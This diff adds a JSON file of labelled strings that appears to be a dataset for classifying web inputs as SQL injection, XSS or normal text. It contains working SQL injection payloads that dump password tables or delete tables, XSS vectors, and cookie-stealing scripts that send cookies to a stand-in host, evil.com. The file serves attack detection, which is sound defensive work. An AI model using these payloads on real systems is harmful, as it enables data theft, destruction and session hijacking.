@@ -1,0 +1,258 @@
+[
+  {
+    "text": "' OR '1'='1",
+    "label": "SQL_INJECTION"
+  },
+  {
+    "text": "1' OR '1' = '1",
+    "label": "SQL_INJECTION"
+  },
+  {
+    "text": "x' AND 1=1 --",
+    "label": "SQL_INJECTION"
+  },
+  {
+    "text": "X' AND 1=1 --",
+    "label": "SQL_INJECTION"
+  },
+  {
+    "text": "1 UNION SELECT name, role FROM accounts",
+    "label": "SQL_INJECTION"
+  },
+  {
+    "text": "1 UNION SELECT email, id FROM accounts",
+    "label": "SQL_INJECTION"
+  },
+  {
+    "text": "1 UNION SELECT username, password FROM admin_users",
+    "label": "SQL_INJECTION"
+  },
+  {
+    "text": "1 UNION SELECT name, role FROM admin_users",
+    "label": "SQL_INJECTION"
+  },
+  {
+    "text": "1 UNION SELECT email, id FROM members",
+    "label": "SQL_INJECTION"
+  },
+  {
+    "text": "1 UNION SELECT name, role FROM users",
+    "label": "SQL_INJECTION"
+  },
+  {
+    "text": "1 UNION SELECT email, id FROM admin_users",
+    "label": "SQL_INJECTION"
+  },
+  {
+    "text": "1 UNION SELECT username, password FROM users",
+    "label": "SQL_INJECTION"
+  },
+  {
+    "text": "1 UNION SELECT email, id FROM users",
+    "label": "SQL_INJECTION"
+  },
+  {
+    "text": "1 UNION SELECT name, role FROM members",
+    "label": "SQL_INJECTION"
+  },
+  {
+    "text": "1 UNION SELECT username, password FROM accounts",
+    "label": "SQL_INJECTION"
+  },
+  {
+    "text": "1 UNION SELECT username, password FROM members",
+    "label": "SQL_INJECTION"
+  },
+  {
+    "text": "1; DELETE FROM users WHERE 1=1",
+    "label": "SQL_INJECTION"
+  },
+  {
+    "text": "1; DELETE FROM admin_users WHERE 1=1",
+    "label": "SQL_INJECTION"
+  },
+  {
+    "text": "1; DELETE FROM accounts WHERE 1=1",
+    "label": "SQL_INJECTION"
+  },
+  {
+    "text": "1; DELETE FROM members WHERE 1=1",
+    "label": "SQL_INJECTION"
+  },
+  {
+    "text": "1' #",
+    "label": "SQL_INJECTION"
+  },
+  {
+    "text": "<script>alert(document.cookie)</script>",
+    "label": "XSS"
+  },
+  {
+    "text": "<sCrIpT>AlErT(DoCuMeNt.cOoKiE)</ScRiPt>",
+    "label": "XSS"
+  },
+  {
+    "text": "<SCRIPT>ALERT(DOCUMENT.COOKIE)</SCRIPT>",
+    "label": "XSS"
+  },
+  {
+    "text": "<oBjEcT DaTa=jAvAsCrIpT:AlErT(1)>",
+    "label": "XSS"
+  },
+  {
+    "text": "<OBJECT DATA=JAVASCRIPT:ALERT(1)>",
+    "label": "XSS"
+  },
+  {
+    "text": "<object data=javascript:alert(1)>",
+    "label": "XSS"
+  },
+  {
+    "text": "<iMg sRc=1 oNeRrOr=aLeRt(STrInG.FrOmChArCoDe(88,83,83))>",
+    "label": "XSS"
+  },
+  {
+    "text": "<IMG SRC=1 ONERROR=ALERT(STRING.FROMCHARCODE(88,83,83))>",
+    "label": "XSS"
+  },
+  {
+    "text": "<img src=1 onerror=alert(String.fromCharCode(88,83,83))>",
+    "label": "XSS"
+  },
+  {
+    "text": "<VIDEO><SOURCE ONERROR=ALERT(1)></VIDEO>",
+    "label": "XSS"
+  },
+  {
+    "text": "<video><source onerror=alert(1)></video>",
+    "label": "XSS"
+  },
+  {
+    "text": "<vIdEo><SoUrCe oNeRrOr=aLeRt(1)></ViDeO>",
+    "label": "XSS"
+  },
+  {
+    "text": "<sCrIpT>WiNdOw.lOcAtIoN='hTtP://EvIl.cOm/sTeAl?c='+dOcUmEnT.CoOkIe</ScRiPt>",
+    "label": "XSS"
+  },
+  {
+    "text": "<script>window.location='http://evil.com/steal?c='+document.cookie</script>",
+    "label": "XSS"
+  },
+  {
+    "text": "<SCRIPT>WINDOW.LOCATION='HTTP://EVIL.COM/STEAL?C='+DOCUMENT.COOKIE</SCRIPT>",
+    "label": "XSS"
+  },
+  {
+    "text": "<link rel=stylesheet href=javascript:alert(1)>",
+    "label": "XSS"
+  },
+  {
+    "text": "<lInK ReL=StYlEsHeEt hReF=JaVaScRiPt:aLeRt(1)>",
+    "label": "XSS"
+  },
+  {
+    "text": "<LINK REL=STYLESHEET HREF=JAVASCRIPT:ALERT(1)>",
+    "label": "XSS"
+  },
+  {
+    "text": "best coffee near me",
+    "label": "NORMAL"
+  },
+  {
+    "text": "search for blue shoes size 10",
+    "label": "NORMAL"
+  },
+  {
+    "text": "what is the weather like in Hanoi today",
+    "label": "NORMAL"
+  },
+  {
+    "text": "what is the weather like in Hue today",
+    "label": "NORMAL"
+  },
+  {
+    "text": "what is the weather like in Ho Chi Minh City today",
+    "label": "NORMAL"
+  },
+  {
+    "text": "what is the weather like in Da Nang today",
+    "label": "NORMAL"
+  },
+  {
+    "text": "checkout with credit card",
+    "label": "NORMAL"
+  },
+  {
+    "text": "great customer service, thank you",
+    "label": "NORMAL"
+  },
+  {
+    "text": "flight from Hanoi to Singapore",
+    "label": "NORMAL"
+  },
+  {
+    "text": "flight from Ho Chi Minh City to Singapore",
+    "label": "NORMAL"
+  },
+  {
+    "text": "flight from Hue to Singapore",
+    "label": "NORMAL"
+  },
+  {
+    "text": "flight from Da Nang to Singapore",
+    "label": "NORMAL"
+  },
+  {
+    "text": "carol left a 5 star review",
+    "label": "NORMAL"
+  },
+  {
+    "text": "bob left a 5 star review",
+    "label": "NORMAL"
+  },
+  {
+    "text": "dave left a 5 star review",
+    "label": "NORMAL"
+  },
+  {
+    "text": "alice left a 5 star review",
+    "label": "NORMAL"
+  },
+  {
+    "text": "directions to the nearest train station",
+    "label": "NORMAL"
+  },
+  {
+    "text": "the temperature is below 1 degree today",
+    "label": "NORMAL"
+  },
+  {
+    "text": "O'Brien confirmed the reservation for 7 guests",
+    "label": "NORMAL"
+  },
+  {
+    "text": "O'Brien confirmed the reservation for 256 guests",
+    "label": "NORMAL"
+  },
+  {
+    "text": "O'Brien confirmed the reservation for 42 guests",
+    "label": "NORMAL"
+  },
+  {
+    "text": "O'Brien confirmed the reservation for 108 guests",
+    "label": "NORMAL"
+  },
+  {
+    "text": "drop by our store this weekend for a sale",
+    "label": "NORMAL"
+  },
+  {
+    "text": "delete old messages to free up space",
+    "label": "NORMAL"
+  },
+  {
+    "text": "update your notification preferences anytime",
+    "label": "NORMAL"
+  }
+]
